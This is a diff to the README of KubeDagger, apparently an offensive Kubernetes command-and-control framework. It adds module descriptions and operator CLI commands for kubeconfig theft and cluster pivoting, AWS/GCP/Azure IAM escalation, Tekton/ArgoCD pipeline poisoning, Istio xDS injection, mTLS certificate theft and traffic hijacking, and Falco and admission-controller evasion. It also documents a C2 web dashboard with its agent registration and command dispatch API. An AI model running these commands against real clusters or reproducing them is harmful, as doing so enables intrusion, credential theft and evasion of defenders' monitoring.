@@ -68,6 +68,7 @@
   - [Agent](#agent)
   - [Operator CLI](#operator-cli)
   - [Module System](#module-system)
+  - [Operator Web UI](#operator-web-ui)
 - [Encrypted C2 Channel](#encrypted-c2-channel)
 - [Persistence](#persistence)
 - [Multi-Node Coordination](#multi-node-coordination)
@@ -1824,6 +1825,11 @@ Agents include a built-in module system for executing specialized techniques wit
 | `webhook_deploy` | linux, windows, darwin | Deploy weaponized admission webhooks for Pod injection |
 | `antiforensics` | linux | Anti-forensics eBPF hooks (audit suppression, log filtering, timestomping) |
 | `autonomy` | linux, windows, darwin | Autonomous objective engine with rule-based forward-chaining planner |
+| `multi_cluster` | linux, windows, darwin | Multi-cluster propagation via kubeconfig theft, federation, service mesh |
+| `cloud_exploit` | linux, windows, darwin | Cloud provider exploitation (AWS, GCP, Azure IAM/metadata attacks) |
+| `cicd_poison` | linux, windows, darwin | CI/CD pipeline poisoning (Tekton, ArgoCD, Flux task/app injection) |
+| `service_mesh` | linux, windows, darwin | Service mesh deep attacks (Istio xDS injection, mTLS cert theft, traffic hijack) |
+| `cloud_evasion` | linux, windows, darwin | Detection evasion (Falco bypass, admission controller evasion, runtime hiding) |
 
 **Module usage via operator:**
 
@@ -1863,6 +1869,94 @@ Agents include a built-in module system for executing specialized techniques wit
 
 # Autonomous objective execution (goal-directed multi-step campaigns)
 ./bin/kubedagger-operator -key $KEY module <agent-id> autonomy objective=persist target=cluster
+
+# Multi-cluster propagation (kubeconfig theft, federation abuse)
+./bin/kubedagger-operator -key $KEY module <agent-id> multi_cluster action=discover
+./bin/kubedagger-operator -key $KEY module <agent-id> multi_cluster action=pivot target=cluster-2
+
+# Cloud provider exploitation (AWS/GCP/Azure IAM attacks)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_exploit action=detect
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_exploit action=iam_escalate provider=aws
+
+# CI/CD pipeline poisoning (Tekton, ArgoCD, Flux injection)
+./bin/kubedagger-operator -key $KEY module <agent-id> cicd_poison action=detect
+./bin/kubedagger-operator -key $KEY module <agent-id> cicd_poison action=inject platform=tekton namespace=tekton-pipelines
+
+# Service mesh deep attacks (Istio/Envoy exploitation)
+./bin/kubedagger-operator -key $KEY module <agent-id> service_mesh action=detect
+./bin/kubedagger-operator -key $KEY module <agent-id> service_mesh action=xds_inject namespace=istio-system
+./bin/kubedagger-operator -key $KEY module <agent-id> service_mesh action=certs namespace=istio-system
+./bin/kubedagger-operator -key $KEY module <agent-id> service_mesh action=hijack source=frontend target=backend namespace=default
+
+# Detection evasion (Falco, admission controllers, runtime detection)
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=detect
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=falco technique=symlink
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=admission technique=bypass_labels
+./bin/kubedagger-operator -key $KEY module <agent-id> cloud_evasion action=runtime technique=fileless
+```
+
+---
+
+### Operator Web UI
+
+KubeDagger includes a web-based operator dashboard for managing agents and dispatching commands without the CLI.
+
+**Starting the Web UI:**
+
+```shell
+# Start with default address (:8080)
+./bin/kubedagger-server -webui
+
+# Or programmatically:
+import "github.com/yasindce1998/KubeDagger/pkg/webui"
+
+server := webui.NewServer(":8080")
+server.Start(ctx)
+```
+
+**Features:**
+- Real-time agent status cards with heartbeat tracking (active/stale)
+- Command dispatch form with module/action/args inputs
+- Command history with status badges (pending, dispatched, completed, failed)
+- Auto-refresh agent list every 5 seconds
+- Dark-themed responsive dashboard
+
+**REST API endpoints:**
+
+| Endpoint | Method | Description |
+|----------|--------|-------------|
+| `/` | GET | Dashboard HTML page |
+| `/api/agents` | GET | List all registered agents |
+| `/api/agents/register` | POST | Register a new agent |
+| `/api/commands` | GET | List all commands |
+| `/api/commands/new` | POST | Create a new command |
+| `/api/commands/poll?agent_id=X` | GET | Poll pending commands (updates agent heartbeat) |
+| `/api/commands/result` | POST | Submit command result |
+
+**Agent registration payload:**
+
+```json
+{
+  "id": "agent-abc123",
+  "hostname": "worker-1",
+  "ip": "10.0.2.5",
+  "os": "linux",
+  "arch": "amd64",
+  "cluster": "prod",
+  "namespace": "default",
+  "pod": "app-7f9b6c-x2k4l",
+  "modules": ["k8s_discovery", "cloud_evasion", "service_mesh"]
+}
+```
+
+**Command dispatch payload:**
+
+```json
+{
+  "agent_id": "agent-abc123",
+  "module": "cloud_evasion",
+  "args": {"action": "detect"}
+}
 ```
 
 ---
